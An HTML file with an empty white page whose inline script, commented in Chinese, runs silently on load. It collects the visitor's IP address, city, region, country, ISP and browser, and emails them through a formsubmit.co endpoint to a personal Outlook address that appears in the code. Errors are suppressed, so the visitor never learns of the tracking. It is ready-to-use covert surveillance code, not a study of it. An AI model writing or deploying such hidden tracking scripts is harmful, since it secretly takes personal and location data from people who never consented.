<!DOCTYPE html>
<html>
<head></head>
<body style="background:#fff;"></body>

<script>
(async function(){
  try {
    // 1. 获取 IP + 位置
    let ip = await fetch('https://api.ipify.org?format=json').then(r=>r.json());
    let loc = await fetch('https://ipapi.co/'+ip.ip+'/json/').then(r=>r.json());

    // 2. 整理内容
    let content = `
有人访问了你的页面
时间：${new Date().toLocaleString()}
IP：${loc.ip}
地区：${loc.city} / ${loc.region} / ${loc.country_name}
运营商：${loc.org}
浏览器：${navigator.userAgent}
`;

    // 3. 【真正能发邮件到你手里】用免费表单接口
    await fetch("https://formsubmit.co/ajax/lcy123eric@outlook.com", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        title: "页面被访问",
        message: content
      })
    });
  }catch(e){}
})();
</script>
</html>
